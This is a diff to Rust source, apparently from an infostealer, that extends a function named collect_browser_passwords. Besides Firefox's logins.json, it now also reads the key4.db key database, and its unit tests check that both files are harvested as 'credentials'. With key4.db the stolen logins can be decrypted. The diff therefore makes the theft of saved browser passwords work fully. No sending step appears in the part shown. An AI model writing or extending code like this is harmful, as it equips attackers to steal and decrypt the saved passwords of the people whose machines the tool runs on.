@@ -1688,16 +1688,29 @@ fn collect_browser_passwords(home: &Path, entries: &mut Vec<HarvestEntry>) {
         }
     }
 
-    // Firefox: logins.json from each profile directory
+    // Firefox: logins.json + key4.db from each profile directory.
+    // logins.json contains the encrypted login entries; key4.db holds the
+    // NSS key material required to decrypt them.  Both are needed.
     let ff_dir = home.join(".mozilla/firefox");
     if let Ok(profiles) = fs::read_dir(&ff_dir) {
         for profile in profiles.flatten() {
-            let logins_path = profile.path().join("logins.json");
+            let profile_path = profile.path();
+            let logins_path = profile_path.join("logins.json");
+            let key4_path = profile_path.join("key4.db");
             if let Ok(data) = fs::read(&logins_path) {
                 if !data.is_empty() {
                     entries.push(HarvestEntry {
                         kind: "credentials".to_owned(),
                         path: logins_path.display().to_string(),
+                        data,
+                    });
+                }
+            }
+            if let Ok(data) = fs::read(&key4_path) {
+                if !data.is_empty() {
+                    entries.push(HarvestEntry {
+                        kind: "credentials".to_owned(),
+                        path: key4_path.display().to_string(),
                         data,
                     });
                 }
@@ -7677,7 +7690,7 @@ mod tests {
     }
 
     #[test]
-    fn collect_browser_passwords_harvests_firefox_logins_json() {
+    fn collect_browser_passwords_harvests_firefox_logins_and_key4() {
         use std::fs;
         use tempfile::TempDir;
 
@@ -7688,13 +7701,35 @@ mod tests {
             profile_dir.join("logins.json"),
             b"{\"logins\":[{\"hostname\":\"https://example.com\"}]}",
         )
-        .expect("write");
+        .expect("write logins.json");
+        fs::write(profile_dir.join("key4.db"), b"SQLite format 3\x00fake-nss-key-db")
+            .expect("write key4.db");
 
         let mut entries = Vec::new();
         collect_browser_passwords(home.path(), &mut entries);
 
-        assert_eq!(entries.len(), 1);
-        assert_eq!(entries[0].kind, "credentials");
+        assert_eq!(entries.len(), 2, "expected both logins.json and key4.db");
+        let paths: Vec<&str> = entries.iter().map(|e| e.path.as_str()).collect();
+        assert!(paths.iter().any(|p| p.contains("logins.json")), "missing logins.json entry");
+        assert!(paths.iter().any(|p| p.contains("key4.db")), "missing key4.db entry");
+        assert!(entries.iter().all(|e| e.kind == "credentials"));
+    }
+
+    #[test]
+    fn collect_browser_passwords_firefox_logins_only_without_key4() {
+        use std::fs;
+        use tempfile::TempDir;
+
+        let home = TempDir::new().expect("tmpdir");
+        let profile_dir = home.path().join(".mozilla/firefox/xyz789.default-release");
+        fs::create_dir_all(&profile_dir).expect("mkdir");
+        fs::write(profile_dir.join("logins.json"), b"{\"logins\":[]}").expect("write logins.json");
+        // key4.db intentionally absent
+
+        let mut entries = Vec::new();
+        collect_browser_passwords(home.path(), &mut entries);
+
+        assert_eq!(entries.len(), 1, "should still harvest logins.json alone");
         assert!(entries[0].path.contains("logins.json"));
     }
 
